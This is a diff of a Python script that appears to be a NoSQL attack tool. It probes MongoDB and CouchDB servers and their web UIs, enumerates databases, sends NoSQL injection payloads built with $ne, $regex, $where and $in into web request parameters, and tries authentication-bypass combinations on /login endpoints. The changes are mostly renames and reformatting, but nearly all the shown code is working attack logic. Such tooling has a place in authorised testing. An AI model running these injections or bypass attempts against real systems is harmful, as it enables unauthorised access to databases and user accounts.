@@ -59,16 +59,12 @@ def parse_args():
 def test_db_access(host, port, engine, creds=None):
     if engine == 'mongodb':
         try:
-            options = {
-                'host': host,
-                'port': port,
-                'serverSelectionTimeoutMS': 5000
-            }
+            opts = {'host': host, 'port': port,
+                    'serverSelectionTimeoutMS': 5000}
             if creds:
-                options.update(username=creds[0],
-                               password=creds[1],
-                               authSource='admin')
-            client = MongoClient(**options)
+                opts.update(username=creds[0],
+                            password=creds[1], authSource='admin')
+            client = MongoClient(**opts)
             client.admin.command('ping')
             version = client.server_info().get('version', 'unknown')
             return True, version, None
@@ -88,44 +84,39 @@ def test_db_access(host, port, engine, creds=None):
 
 
 def detect_mongodb_mgmt(host):
-    url = f'http://{host}:28017'
+    ui = f'http://{host}:28017'
     try:
-        r = requests.get(url, timeout=5)
+        r = requests.get(ui, timeout=5)
         if r.status_code == 200:
-            print(Fore.GREEN + f'[+] MongoDB HTTP UI at {url}')
+            print(Fore.GREEN + f'[+] MongoDB HTTP UI at {ui}')
     except:
         pass
 
 
 def detect_couchdb_ui(host, port):
-    url = f'http://{host}:{port}/_utils/'
+    ui = f'http://{host}:{port}/_utils/'
     try:
-        r = requests.get(url, timeout=5)
+        r = requests.get(ui, timeout=5)
         if r.status_code == 200:
-            print(Fore.GREEN + f'[+] CouchDB Fauxton at {url}')
+            print(Fore.GREEN + f'[+] CouchDB Fauxton at {ui}')
     except:
         pass
 
 
 def enumerate_mongodb(host, port, creds, csvw=None):
     try:
-        options = {
-            'host': host,
-            'port': port,
-            'serverSelectionTimeoutMS': 5000
-        }
+        opts = {'host': host, 'port': port,
+                'serverSelectionTimeoutMS': 5000}
         if creds:
-            options.update(username=creds[0],
-                           password=creds[1],
-                           authSource='admin')
-        client = MongoClient(**options)
+            opts.update(username=creds[0],
+                        password=creds[1], authSource='admin')
+        client = MongoClient(**opts)
         dbs = client.list_database_names()
     except mongo_errors.OperationFailure:
         print(Fore.YELLOW +
               '[!] listDatabases needs auth; using common DBs')
         dbs = COMMON_MONGO_DBS.copy()
-        client = MongoClient(host=host,
-                             port=port,
+        client = MongoClient(host=host, port=port,
                              serverSelectionTimeoutMS=5000)
     except Exception as e:
         print(Fore.RED + f'[!] MongoDB enumeration failed: {e}')
@@ -238,9 +229,9 @@ def handle_db(args):
                       f'{DEFAULT_PORTS[engine]} ({err})')
         if args.output:
             with open(args.output, 'w', newline='') as f:
-                w = csv.writer(f)
-                w.writerow(['host', 'version'])
-                w.writerows(results)
+                writer = csv.writer(f)
+                writer.writerow(['host', 'version'])
+                writer.writerows(results)
         return
 
     # single host:port
@@ -297,8 +288,8 @@ def handle_db(args):
 def handle_web(args):
     # 1) Load from Burp or CLI
     if args.request:
-        method, full, headers, raw = parse_burp_request(args.request)
-        p = urlparse(full)
+        method, full_uri, headers, raw = parse_burp_request(args.request)
+        p = urlparse(full_uri)
         base = urlunparse((p.scheme, p.netloc, p.path, '', '', ''))
         orig = dict(parse_qsl(p.query, keep_blank_values=True))
         jb, data_json = None, False
@@ -337,18 +328,18 @@ def handle_web(args):
     # 2) Baseline request
     try:
         if method == 'GET':
-            br = requests.get(base, params=orig, headers=headers, timeout=10)
+            baseline = requests.get(base, params=orig, headers=headers, timeout=10)
         elif data_json:
-            br = requests.post(base, json=jb, headers=headers, timeout=10)
+            baseline = requests.post(base, json=jb, headers=headers, timeout=10)
         else:
-            br = requests.post(base, data=orig, headers=headers, timeout=10)
+            baseline = requests.post(base, data=orig, headers=headers, timeout=10)
     except Exception as e:
         print(Fore.RED + f'[!] Baseline failed: {e}')
         sys.exit(1)
 
-    blen = len(br.text)
+    blen = len(baseline.text)
     print(Fore.GREEN +
-          f'[+] Baseline: {br.status_code} {br.reason}, len={blen}')
+          f'[+] Baseline: {baseline.status_code} {baseline.reason}, len={blen}')
 
     # 3) General injection tests
     tests = [
@@ -387,7 +378,9 @@ def handle_web(args):
                         elif op == '$where':
                             p_params[k] = fn(v)
                         else:
-                            p_params[f'{k}[{op}]'] = (v if op == '$ne' else fn(v))
+                            p_params[f'{k}[{op}]'] = (
+                                v if op == '$ne' else fn(v)
+                            )
                     else:
                         if op == '$in':
                             p_params = {f'{k}[$in]': ','.join(fn(v))}
@@ -413,6 +406,7 @@ def handle_web(args):
                 else:
                     p_params = {k: pl}
 
+            # Send injection
             try:
                 if method == 'GET':
                     r = requests.get(base, params=p_params,
@@ -441,8 +435,7 @@ def handle_web(args):
                     print(f'      {hk}: {hv}')
                 if req.body:
                     btxt = (req.body.decode()
-                            if isinstance(req.body, bytes)
-                            else str(req.body))
+                            if isinstance(req.body, bytes) else str(req.body))
                     for line in btxt.splitlines():
                         print(f'      {line}')
                 print(Fore.GREEN + '      --- HTTP RESPONSE ---')
@@ -457,31 +450,28 @@ def handle_web(args):
             else:
                 print(f'  [-] {k} Δ={delta} status={r.status_code}')
 
-    # 4) Authentication bypass on /login
-    path = urlparse(base).path.lower()
-    if method == 'POST' and path.endswith('/login'):
+    # 4) Auth-bypass on /login
+    parsed_path = urlparse(base).path.lower()
+    if method == 'POST' and parsed_path.endswith('/login'):
         print('\n' + Fore.YELLOW + '[*] Testing auth-bypass combos')
-        # original username
         user0 = jb.get('username') if data_json else orig.get('username', '')
-
         scenarios = [
-            ('user $ne',       {'username': {'$ne': ''}}),
-            ('user regex',     {'username': {'$regex': user0 + '.*'}}),
-            ('both $ne',       {'username': {'$ne': ''},
-                                'password': {'$ne': ''}}),
+            ('user $ne', {'username': {'$ne': ''}}),
+            ('user regex', {'username': {'$regex': user0 + '.*'}}),
+            ('both $ne', {'username': {'$ne': ''},
+                          'password': {'$ne': ''}}),
             ('admin regex + $ne pw', {
                 'username': {'$regex': 'admin.*'},
                 'password': {'$ne': ''}
             })
         ]
-
         for label, payload in scenarios:
             print(Fore.YELLOW + f'  [*] {label}')
             if data_json:
-                pbody = jb.copy()
-                pbody.update(payload)
+                body = jb.copy()
+                body.update(payload)
                 send = lambda: requests.post(
-                    base, json=pbody, headers=headers, timeout=20)
+                    base, json=body, headers=headers, timeout=20)
             else:
                 params = orig.copy()
                 for fld, val in payload.items():
@@ -493,20 +483,15 @@ def handle_web(args):
                         params[fld] = val
                 send = lambda: requests.post(
                     base, data=params, headers=headers, timeout=20)
-
             try:
-                rr = send()
+                resp2 = send()
             except Exception as e:
-                print(Fore.RED + f'    [!] request error: {e}')
+                print(Fore.RED + f'    [!] auth request error: {e}')
                 continue
-
-            ok = (rr.status_code in (200, 302)) and ('Invalid' not in rr.text)
-            print(Fore.GREEN +
-                  f'    -> status={rr.status_code}, bypass={"yes" if ok else "no"}')
+            ok = (resp2.status_code in (200, 302)) and ('Invalid' not in resp2.text)
+            print(Fore.GREEN + f'    -> status={resp2.status_code}, bypass={"yes" if ok else "no"}')
             if ok:
-                print(Fore.GREEN +
-                      f'      Payload: '
-                      f'{json.dumps(payload) if data_json else payload}')
+                print(Fore.GREEN + f'      Payload: {json.dumps(payload) if data_json else payload}')
 
     # Summary
     if found:
